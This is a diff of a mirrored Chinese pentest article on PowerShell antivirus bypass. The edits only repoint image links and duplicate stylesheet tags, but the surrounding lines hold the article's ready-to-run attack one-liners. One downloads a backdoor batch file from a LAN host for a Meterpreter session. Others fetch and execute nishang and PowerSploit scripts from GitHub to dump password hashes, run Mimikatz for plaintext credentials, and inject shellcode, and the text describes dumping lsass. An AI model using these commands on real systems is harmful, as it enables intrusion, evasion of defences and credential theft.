@@ -3,7 +3,7 @@
 			<head>
 			     <title>Powershell tricks::Bypass AV - DM_</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/3353">http://drops.wooyun.org/tips/3353</a></h1>
 				
@@ -121,17 +121,17 @@ Active sessions
 <pre><code>powershell (new-object System.Net.WebClient).DownloadFile( 'http://192.168.200.159/backdoor','backdoor.bat')
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20141026/2014102614542482592.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014102614542482592.png" alt="enter image description here"></p>
 
 <p>然后再执行就可以得到meterpreter会话了。</p>
 
-<p><img src="http://static.wooyun.org/20141026/2014102614542478857.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014102614542478857.png" alt="enter image description here"></p>
 
 <p>并且可以正常执行cmd命令、dump hash明文等操作。</p>
 
-<p><img src="http://static.wooyun.org/20141026/2014102614542531867.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014102614542531867.png" alt="enter image description here"></p>
 
-<p><img src="http://static.wooyun.org/20141026/2014102614542545954.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014102614542545954.png" alt="enter image description here"></p>
 
 <h2>0x03 Dump the hash</h2>
 
@@ -142,7 +142,7 @@ Active sessions
 <pre><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20141026/2014102614542651245.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014102614542651245.png" alt="enter image description here"></p>
 
 <h2>0x04 Dump the plain Password</h2>
 
@@ -153,7 +153,7 @@ Active sessions
 <pre><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz –DumpCerts
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20141026/2014102614542650235.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014102614542650235.png" alt="enter image description here"></p>
 
 <p>值得注意的是在这里也可以通过Command参数执行Mimikatz命令。</p>
 
@@ -163,11 +163,11 @@ Active sessions
 
 <p>Powershell也可以完成像procdump一样的工作，获取某个进程的dumps。 这里演示获取lsass.exe的dumps，然后再用Mimikatz从dumps中获取明文。</p>
 
-<p><img src="http://static.wooyun.org/20141026/2014102614542672751.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014102614542672751.png" alt="enter image description here"></p>
 
 <p>然后将lsass dumps文件下载回来用Mimikatz分析可以得到明文密码。</p>
 
-<p><img src="http://static.wooyun.org/20141026/2014102614542643509.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014102614542643509.png" alt="enter image description here"></p>
 
 <p>当然内存dumps不仅仅可以获取windows密码，往往进程内存中或许会储存其他重要的信息或数据。参考<a href="http://blog.spiderlabs.com/2012/07/pentesting-like-an-eastern-european.html">http://blog.spiderlabs.com/2012/07/pentesting-like-an-eastern-european.html</a>。</p>
 
@@ -180,7 +180,7 @@ Active sessions
 <pre><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode –help
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20141026/2014102614542741148.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014102614542741148.png" alt="enter image description here"></p>
 
 <p>但是在这里有个问题，就是x64下shellcode已有的很少，往往通过网上搜集的shellcode都是x86的。如果直接执行x86的shellcode则会出错。</p>
 
@@ -189,7 +189,7 @@ Active sessions
 <pre><code>c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Shellcode 0x90,0x90,0x90 ...
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20141026/2014102614542779956.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014102614542779956.png" alt="enter image description here"></p>
 
 <p>并且这一过程适用于大部分msfpayload生成的shellcode。当然在windows下执行shellcode也可以用其它的方法，比如<a href="https://github.com/inquisb/shellcodeexec">shellcodeexec</a>。不过这个方法并不能bypass AV。但是大家可以根据源码自行bypass。</p>
 
